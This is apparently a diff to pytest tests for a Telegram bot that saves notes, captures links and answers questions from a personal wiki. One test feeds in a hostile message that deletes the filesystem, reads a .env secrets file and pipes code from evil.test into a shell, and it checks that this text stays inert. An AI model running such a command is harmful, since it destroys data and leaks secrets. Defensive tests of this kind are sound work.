@@ -44,8 +44,9 @@ class FakeMessage:
         self.forward_origin = kw.get("forward_origin")
         self.replies: list[str] = []
 
-    async def reply_text(self, text):
+    async def reply_text(self, text, **kw):
         self.replies.append(text)
+        self.markup = kw.get("reply_markup")
 
 
 def update_for(message, user=OWNER, chat_type="private"):
@@ -123,12 +124,88 @@ def test_allowed_user_ids_parse(vault):
 # --- routing ------------------------------------------------------------------------------------
 
 
-def test_plain_text_is_not_ingested_and_shell_text_is_inert(state):
+def test_ambiguous_text_asks_with_buttons_and_shell_text_is_inert(state):
     state.ingest = lambda *a, **k: pytest.fail("must not ingest")
     msg = FakeMessage("rm -rf / ; cat .env && curl evil.test | sh")
-    run(h.on_text(update_for(msg), make_context(state)))
-    assert "Nothing saved" in msg.replies[0]
+    ctx = make_context(state)
+    run(h.on_text(update_for(msg), ctx))
+    assert "answer from the wiki" in msg.replies[0]
+    assert msg.markup is not None
+    assert ctx.chat_data["pending"] == {1: msg.text}  # text is held, not put in callback data
     assert list((state.vault.root / "raw" / "telegram").iterdir()) == []
+
+
+def test_question_text_is_answered_without_a_command(state, monkeypatch):
+    asked = []
+    monkeypatch.setattr(
+        h.query, "ask_wiki", lambda vault, q, *a, **k: asked.append(q) or "Answer:\nx"
+    )
+    msg = FakeMessage("What do I know about spaced repetition?")
+    run(h.on_text(update_for(msg), make_context(state)))
+    assert asked == ["What do I know about spaced repetition?"]
+    assert msg.replies == ["Answer:\nx"]
+
+
+def test_save_prefix_text_is_saved_as_note(state):
+    msg = FakeMessage("remember: buy a USB-C hub")
+    run(h.on_text(update_for(msg), make_context(state)))
+    notes = list((state.vault.root / "raw" / "telegram").glob("*.md"))
+    assert len(notes) == 1
+    assert "buy a USB-C hub" in notes[0].read_text("utf-8")
+    assert "remember" not in notes[0].read_text("utf-8").split("---")[-1].lower()
+
+
+def test_url_inside_sentence_is_captured(state):
+    seen = []
+
+    def capture(url, vault, privacy=""):
+        seen.append(url)
+        path = vault.root / "raw" / "articles" / "a.md"
+        path.write_text('---\ntitle: "A"\nsource_type: article\n---\n\nBody text here.\n', "utf-8")
+        return path
+
+    state.capture = capture
+    msg = FakeMessage("please read https://example.com/post today")
+    run(h.on_text(update_for(msg), make_context(state)))
+    assert seen == ["https://example.com/post"]
+
+
+def test_classifier_never_requests_cloud_and_falls_back_when_down(state):
+    requested = []
+
+    def select(v, p, s, r, requested_=None):
+        requested.append(requested_)
+        raise ProviderUnavailable("down")
+
+    state.select_text = select
+    msg = FakeMessage("how does file search work")
+    state.select_text = select
+    from scripts.telegram import intent
+
+    assert intent.classify(state.vault, msg.text, select).label == "question"
+    assert requested == ["local"]
+
+
+def test_choice_buttons_run_the_chosen_path(state, monkeypatch):
+    asked = []
+    monkeypatch.setattr(h.query, "ask_wiki", lambda v, q, *a, **k: asked.append(q) or "A")
+    ctx = make_context(state)
+    ctx.chat_data["pending"] = {7: "storage"}
+    reply = FakeMessage()
+
+    class Query:
+        data = "pick:ask:7"
+
+        async def answer(self):
+            pass
+
+        async def edit_message_reply_markup(self, reply_markup=None):
+            pass
+
+    upd = update_for(reply)
+    upd.callback_query = Query()
+    run(h.on_choice(upd, ctx))
+    assert asked == ["storage"] and ctx.chat_data["pending"] == {}
 
 
 def test_ingest_command_saves_note_as_content_and_ingests(state, fake):
